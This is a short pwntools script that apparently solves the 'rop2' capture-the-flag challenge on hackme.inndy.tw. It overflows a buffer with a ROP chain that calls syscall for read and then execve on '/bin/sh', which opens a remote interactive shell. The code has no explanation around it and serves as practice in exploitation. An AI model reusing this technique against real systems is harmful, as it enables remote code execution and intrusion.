from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

target = remote('hackme.inndy.tw',7703)
elf = ELF('./rop2')
addr_bss = elf.bss()
addr_sys = elf.symbols['syscall']
addr_gadget = 0x08048578
payload = ''
payload = fit({0xc + 0x4:[p32(addr_sys),p32(addr_gadget),p32(3),p32(0),p32(addr_bss),p32(30)]})
payload += fit({0x0:[p32(addr_sys),p32(0xdeadbeef),p32(11),p32(addr_bss),p32(0),p32(0)]})
target.sendlineafter('your ropchain:',payload)
target.send('/bin/sh\x00')
target.interactive()


